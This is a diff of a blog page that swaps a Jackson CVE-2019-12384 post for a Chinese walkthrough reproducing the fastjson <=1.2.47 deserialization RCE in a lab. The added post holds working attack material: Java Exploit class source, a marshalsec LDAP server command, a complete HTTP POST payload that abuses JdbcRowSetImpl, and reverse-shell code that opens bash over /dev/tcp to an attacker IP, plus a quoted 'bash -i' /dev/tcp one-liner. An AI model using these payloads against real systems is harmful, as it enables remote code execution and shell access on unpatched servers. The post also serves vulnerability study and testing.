@@ -48,15 +48,12 @@
 <ul>
 <li>
 <ul>
-<li>
-<ul>
-<li><a href="#1%E9%A6%96%E5%85%88%E6%89%93%E5%BC%80http%E6%9C%8D%E5%8A%A1%E8%BF%99%E9%87%8C%E7%94%A8%E7%9A%84%E6%98%AFpython3%E8%87%AA%E5%B8%A6%E7%9A%84%E5%85%B6%E4%BB%96%E7%9A%84%E4%B9%9F%E5%8F%AF%E5%8F%AA%E8%A6%81%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%88%B0">1.首先打开http服务，这里用的是python3自带的，其他的也可，只要可以访问到</a></li>
-<li><a href="#2%E9%85%8D%E7%BD%AEjruby%E8%BF%99%E9%87%8C%E5%9B%A0%E4%B8%BA%E6%88%91%E4%B9%8B%E5%89%8D%E9%85%8D%E7%BD%AE%E8%BF%87%E6%89%80%E4%BB%A5%E5%B7%B2%E5%AD%98%E5%9C%A8%E5%B9%B6%E6%97%A0%E5%BD%B1%E5%93%8Djruby%E5%B7%B2%E6%89%93%E5%8C%85">2.配置jruby，这里因为我之前配置过，所以已存在，并无影响，jruby已打包</a></li>
-<li><a href="#3%E8%BF%90%E8%A1%8Ctestrb%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">3.运行test.rb,进行命令执行</a></li>
-<li><a href="#4%E8%BF%99%E9%87%8C%E7%9A%84injectsql%E4%B8%BA%E5%86%99%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%87%E4%BB%B6%E6%AD%A4%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8http%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95%E9%87%8Cjackson%E8%A6%81%E8%83%BD%E8%BF%9C%E7%A8%8B%E8%8E%B7%E5%8F%96%E5%88%B0">4.这里的inject.sql，为写命令的文件，此文件放在http服务的根目录里，jackson要能远程获取到</a></li>
-<li><a href="#5%E5%9C%A8%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%AD%A5%E7%9A%84%E6%97%B6%E5%80%99%E5%B7%B2%E7%BB%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%8C%E6%88%90%E5%9C%A8http%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%BC%9A%E7%94%9F%E6%88%90exploitedtxt%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E5%9B%9E%E6%98%BE">5.在完成第三步的时候，已经命令执行完成，在http服务的根目录会生成exploited.txt文件，里面是命令执行后得到的回显</a></li>
-</ul>
-</li>
+<li><a href="#0x01-%E8%83%8C%E6%99%AF">0x01 背景</a></li>
+<li><a href="#0x02-%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83">0x02 网络环境</a></li>
+<li><a href="#0x03-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x03 环境搭建</a></li>
+<li><a href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x04 漏洞利用</a></li>
+<li><a href="#0x05-%E5%8F%8D%E5%BC%B9shell">0x05 反弹shell</a></li>
+<li><a href="#0x06-%E5%9D%91%E7%82%B9">0x06 坑点</a></li>
 </ul>
 </li>
 </ul>
@@ -107,29 +104,152 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">FasterXML Jackson远程命令执行漏洞（复现CVE-2019-12384）</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">fastjson&lt;=1.2.47漏洞复现</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2019-07-30 / 1 min read
+          2019-10-21 / 5 min read
         </div>
         
-          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384.jpg" alt="">
-        
         <div class="post-content yue">
-          <h4 id="1首先打开http服务这里用的是python3自带的其他的也可只要可以访问到">1.首先打开http服务，这里用的是python3自带的，其他的也可，只要可以访问到</h4>
-<p>ps:python自带的这个服务从哪个文件夹打开，此文件夹为默认根目录<br>
-<img src="http://www.svenbeast.com//post-images/1564481595025.png" alt=""></p>
-<h4 id="2配置jruby这里因为我之前配置过所以已存在并无影响jruby已打包">2.配置jruby，这里因为我之前配置过，所以已存在，并无影响，jruby已打包</h4>
-<p>ps:ln -s ~/jruby-9.2.7.0/bin/jruby /usr/local/bin/<br>
-<img src="http://www.svenbeast.com//post-images/1564482020021.png" alt=""></p>
-<h4 id="3运行testrb进行命令执行">3.运行test.rb,进行命令执行</h4>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1564482687320.png" alt=""></figure>
-<h4 id="4这里的injectsql为写命令的文件此文件放在http服务的根目录里jackson要能远程获取到">4.这里的inject.sql，为写命令的文件，此文件放在http服务的根目录里，jackson要能远程获取到</h4>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1564483081513.png" alt=""></figure>
-<h4 id="5在完成第三步的时候已经命令执行完成在http服务的根目录会生成exploitedtxt文件里面是命令执行后得到的回显">5.在完成第三步的时候，已经命令执行完成，在http服务的根目录会生成exploited.txt文件，里面是命令执行后得到的回显</h4>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1564483152187.png" alt=""></figure>
-<p>PS：解压密码:svenbeast<br>
-链接: https://pan.baidu.com/s/1yhdmOz3QQ7Nm_Ar6m4-dWg<br>
-提取码: avpe</p>
+          <h3 id="0x01-背景">0x01 背景</h3>
+<pre><code>为以后遇到java环境增加测试项做准备，防止一脸懵逼情况发生🙀，并且一般到时再看为时已晚，so先下手为强😇。
+</code></pre>
+<h3 id="0x02-网络环境">0x02 网络环境</h3>
+<pre><code>攻击机：
+os:windows10
+服务器：
+os:kali虚拟机，ip:192.168.124.55，jdk版本:jdk8u181，中间件:tomcat9
+目标机：
+os:ubuntu虚拟机，ip：172.21.139.103，中间件：tomcat9，jdk版本:jdk8u181
+</code></pre>
+<h3 id="0x03-环境搭建">0x03 环境搭建</h3>
+<pre><code>unbutu&amp;kali安装jdk：jdk8u181
+    链接: https://pan.baidu.com/s/1nI-JT93vjcA9--7fb0fhqw&amp;shfl=shareset 提取码: sven
+tomcat下载：https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.tar.gz
+fastjson1.2.47：
+    链接: https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset 提取码: sven
+工具：marshalsec，需要用mvn打包一下，github：https://github.com/mbechler/marshalsec
+    链接(已打包好): https://pan.baidu.com/s/1kT9vwhNDDdiJ3dL9BS3U4w&amp;shfl=shareset 提取码: sven
+</code></pre>
+<ul>
+<li>mvn打包截图及使用命令<br>
+<img src="http://www.svenbeast.com//post-images/1571644519217.png" alt=""></li>
+<li>细节配置就不说了，大概就是服务器开启ldap并配置web能访问到exp，靶机安装好jdk放入fastjson环境，然后攻击机使用poc进行请求，完事</li>
+</ul>
+<p>访问靶机界面：<br>
+<img src="http://www.svenbeast.com//post-images/1571661306111.png" alt=""></p>
+<h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
+<p>Exploit:</p>
+<pre><code>import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Exploit{
+    public Exploit() throws Exception {
+        Process p = Runtime.getRuntime().exec(&quot;touch /tmp/fastjson.test&quot;);
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+</code></pre>
+<ul>
+<li>1.编译一下Exploit.java,生成Exploit.class，将2个文件放入服务器webapps/fastjson下<br>
+<img src="http://www.svenbeast.com//post-images/1571662553861.png" alt=""></li>
+<li>2.服务器使用marshalsec开启ldap服务：</li>
+</ul>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.124.55:8080/fastjson/#Exploit 8088
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1571661251212.png" alt=""></figure>
+<ul>
+<li>3.查看一下靶机源码，发现参数name和age，构造一下，回显正常，<br>
+ps:真实环境中这些都是目标机自带的，找到提交json的地方构造poc即可<br>
+<img src="http://www.svenbeast.com//post-images/1571641485626.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1571641954462.png" alt=""></li>
+<li>4.放上poc，查看靶机是否成功执行命令</li>
+</ul>
+<pre><code>POST /fastjson/ HTTP/1.1
+Host: 192.168.124.34:8080
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 256
+
+{
+  &quot;name&quot;: {
+    &quot;@type&quot;: &quot;java.lang.Class&quot;,
+    &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+  },
+  &quot;x&quot;: {
+    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;: &quot;ldap://192.168.124.55:8088/fastjson/Exploit&quot;,
+    &quot;autoCommit&quot;: true
+  }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1571661421637.png" alt=""></figure>
+<ul>
+<li>
+<p>5.服务器的Ldap已接收到请求，靶机的/tmp/fastjson.test文件也已存在，命令成功执行</p>
+<p><img src="http://www.svenbeast.com//post-images/1571663164486.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1571663218133.png" alt=""></p>
+</li>
+</ul>
+<h3 id="0x05-反弹shell">0x05 反弹shell</h3>
+<ul>
+<li>坑点之一，java反弹shell，无法直接使用bash -i &gt;&amp; /dev/tcp/119.28.130.53/18888 0&gt;&amp;1</li>
+</ul>
+<pre><code>反弹shell_Exp:
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Exploit{
+    public Exploit() throws Exception {
+        Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.124.5/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1571663527253.png" alt=""></figure>
+<h3 id="0x06-坑点">0x06 坑点</h3>
+<ul>
+<li>1.未编译Exploit.java，只放入服务器1个.java文件</li>
+<li>2.java反弹shell无法直接使用linux命令反弹</li>
+<li>3.jdk版本需要注意，下方图片jdk版本不存在此漏洞</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1571663940441.png" alt=""></figure>
 
         </div>
 
@@ -138,21 +258,12 @@
 
         <div class="flex justify-between py-8">
           
-            <div class="prev-post">
-              <a href="http://www.svenbeast.com//post/U4oArG5HS">
-                <h3 class="post-title">
-                  <i class="remixicon-arrow-left-line"></i>
-                  Linux桌面版本地提权(CVE-2019-13272漏洞复现)
-                </h3>
-              </a>
-            </div>
-          
 
           
             <div class="next-post">
-              <a href="http://www.svenbeast.com//post/discuzml33-lou-dong-fu-xian-ji-fen-xi-fu-poc">
+              <a href="http://www.svenbeast.com//post/WH877Va6k">
                 <h3 class="post-title">
-                  Discuz!ml3.3漏洞复现及分析(附POC)
+                  Joomla 3.4.6-RCE漏洞利用
                   <i class="remixicon-arrow-right-line"></i>
                 </h3>
               </a>
